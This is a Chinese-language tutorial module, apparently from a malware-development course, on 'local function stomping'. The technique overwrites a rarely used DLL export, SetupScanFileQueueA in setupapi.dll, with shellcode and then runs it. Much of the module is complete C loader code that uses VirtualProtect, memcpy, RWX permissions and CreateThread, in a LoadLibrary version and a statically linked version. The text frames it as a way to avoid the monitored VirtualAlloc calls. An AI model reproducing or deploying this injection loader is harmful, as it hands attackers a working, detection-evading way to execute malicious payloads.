模块 44 - 本地函数篡改注入

之前展示的映射注入模块用于避免使用 VirtualAlloc/Ex WinAPI 调用。此模块将演示另一种避免使用这些 WinAPI 的方法。

函数覆盖（Function Stomping）

"Stomping" 一词指的是用不同的数据覆盖或替换程序中函数或其他数据结构的内存。

函数覆盖是一种技术，它用新代码替换原始函数的字节，导致函数被替换或不再按预期工作。相反，函数将执行不同的逻辑。要实现这一点，需要一个被覆盖的牺牲函数地址。

选择目标函数

本地获取函数地址很简单，但重点是获得哪个函数。覆盖常用函数可能导致 Payload 执行不可控或进程崩溃。因此，针对 ntdll.dll、kernel32.dll 和 kernelbase.dll 导出的函数是有风险的。相反，针对使用频率较低的函数，例如 MessageBox，相对安全，因为操作系统或其他应用程序很少使用它。

使用 Stomped 函数

当目标函数的字节被有效负载的字节替换时，函数将无法被使用，除非它是专门用于执行有效负载的。例如，如果目标函数是 MessageBoxA，则二进制程序应该仅调用 MessageBoxA 一次，即在有效负载被执行时。

局部函数破坏代码

以下代码演示中，目标函数是 SetupScanFileQueueA。这是一个完全随机的函数，但如果它被覆盖，不太可能造成任何问题。基于 Microsoft 的文档，该函数从 Setupapi.dll 导出。因此，第一步是使用 LoadLibraryA 将 Setupapi.dll 加载到本地进程内存中，然后使用 GetProcAddress 检索函数的地址。

下一步是破坏函数并用有效载荷替换它。使用 VirtualProtect 标记其内存区域为可读可写以确保可以覆盖函数。接下来，将有效载荷写入函数的地址，最后，再次使用 VirtualProtect 将该区域标记为可执行（RX 或 RWX）。

#define SACRIFICIAL_DLL "setupapi.dll"
#define SACRIFICIAL_FUNC "SetupScanFileQueueA"
// ...

BOOL WritePayload(IN PVOID pAddress, IN PBYTE pPayload, IN SIZE_T sPayloadSize)
{
    DWORD dwOldProtection = NULL;

    if (!VirtualProtect(pAddress, sPayloadSize, PAGE_READWRITE, &dwOldProtection)) {
        printf("[!] VirtualProtect [RW] Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    memcpy(pAddress, pPayload, sPayloadSize);

    if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("[!] VirtualProtect [RWX] Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

int main()
{
    PVOID pAddress = NULL;
    HMODULE hModule = NULL;
    HANDLE hThread = NULL;

    printf("[#] 按 <Enter> 键加载 \"%s\" ... ", SACRIFICIAL_DLL);
    getchar();

    printf("[i] 正在加载 ... ");
    hModule = LoadLibraryA(SACRIFICIAL_DLL);
    if (hModule == NULL) {
        printf("[!] LoadLibraryA 失败，错误：%d \n", GetLastError());
        return -1;
    }
    printf("[+] 完成 \n");

    pAddress = GetProcAddress(hModule, SACRIFICIAL_FUNC);
    if (pAddress == NULL) {
        printf("[!] GetProcAddress 失败，错误：%d \n", GetLastError());
        return -1;
    }

    printf("[+] 函数 \"%s\" 的地址：0x%p \n", SACRIFICIAL_FUNC, pAddress);

    printf("[#] 按 <Enter> 键写入有效载荷 ... ");
    getchar();
    printf("[i] 正在写入 ... ");
    if (!WritePayload(pAddress, Payload, sizeof(Payload))) {
        return -1;
    }
    printf("[+] 完成 \n");

    printf("[#] 按 <Enter> 键运行有效载荷 ... ");
    getchar();

    hThread = CreateThread(NULL, NULL, pAddress, NULL, NULL, NULL);
    if (hThread != NULL)
        WaitForSingleObject(hThread, INFINITE);

    printf("[#] 按 <Enter> 键退出 ... ");
    getchar();

    return 0;
}

将 DLL 嵌入到二进制文件中

除了使用 LoadLibrary 加载 DLL，然后使用 GetProcAddress 检索目标函数的地址外，还可以将 DLL 静态链接到二进制文件中。如下所示，使用 pragma 注释编译器指令即可实现此目的。

#pragma comment (lib, "Setupapi.lib") // 将 "setupapi.dll" 添加到导入地址表

然后，可以使用地址运算符直接检索目标函数（例如：&SetupScanFileQueueA）。下面的代码片段更新了之前的代码片段，以使用 pragma 注释指令。

#pragma comment (lib, "Setupapi.lib") // 将 "setupapi.dll" 添加到导入地址表

// ...

int main() {

    HANDLE      hThread          = NULL;

    printf("[+] \"SetupScanFileQueueA\" 的地址：0x%p \n", &SetupScanFileQueueA);

    printf("[#] 按 <Enter> 键写入 Payload ... ");
    getchar();
    printf("[i] 写入中 ... ");
    if (!WritePayload(&SetupScanFileQueueA, Payload, sizeof(Payload))) { // 使用地址运算符
        return -1;
    }
    printf("[+] 完成 \n");

    printf("[#] 按 <Enter> 键运行 Payload ... ");
    getchar();

    hThread = CreateThread(NULL, NULL, SetupScanFileQueueA, NULL, NULL, NULL);
    if (hThread != NULL)
        WaitForSingleObject(hThread, INFINITE);

    printf("[#] 按 <Enter> 键退出 ... ");
    getchar();

    return 0;
}
